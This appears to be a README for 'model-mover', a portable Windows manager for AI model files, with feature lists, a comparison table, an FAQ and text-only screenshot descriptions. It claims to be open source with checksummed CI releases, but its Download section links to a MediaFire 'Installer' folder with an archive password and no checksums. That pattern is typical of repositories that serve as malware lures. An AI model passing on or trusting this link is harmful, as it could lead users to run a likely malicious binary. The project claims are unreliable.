# model-mover

🚚 Free, open-source model library manager for Windows — scan drives, dedupe by hash, move verified, share via junctions. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Whole-drive model scan** — finds .gguf, .safetensors and .ckpt piles across every folder and drive
- ✅ **Hash dedupe** — identical copies matched by content hash, not filename, with the best copy kept
- ✅ **Verified moves** — copy, checksum, then remove the source only after the bytes match
- ✅ **Library junction** — one real models folder shared with LM Studio and llama.cpp via a Windows junction
- ✅ **Space report** — per-drive totals and stale model detection for the cleanup that actually frees space
- ✅ **Restore point notes** — every operation logged with a plain-text undo trail
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why model-mover

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **model-mover** | Manual Explorer moves | Generic dupe finders | Library tools |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Varies | Varies |
| Open source | **Yes** | N/A | Partial | Partial
| Model file awareness | **Yes** | Manual | None | Partial
| Verified move with hash | **Yes** | No | No | No
| Junction sharing for apps | **Yes** | Manual cmd | No | No |
| Portable, no install | **Yes, 100 MB** | N/A | Varies | Varies

## FAQ

**models fill my drive — how to dedupe and move GGUF files safely?**

The same 20 GB model usually exists three times under different names, and Explorer moves fail next to multi-GB files. model-mover hashes every copy, moves with verification and can share one library across apps with a junction. It is a 100 MB portable exe, MIT, offline, with an undo log for every action.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark library (#121417, emerald #10B981): drive map with model counts per folder, duplicate group expanded showing two identical GGUFs and kept-copy badge.
2. Move dialog: source and destination paths, verify-after-copy toggle on, progress with hash comparison line, estimated time chip reading 4 minutes.
3. Space report: per-drive usage bars, stale models list with last-opened dates, junction status card reading three apps share one folder.

## Download

| Source | Link |
|---|---|
| 💾 **Installer model-mover** | [Installer model-mover](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).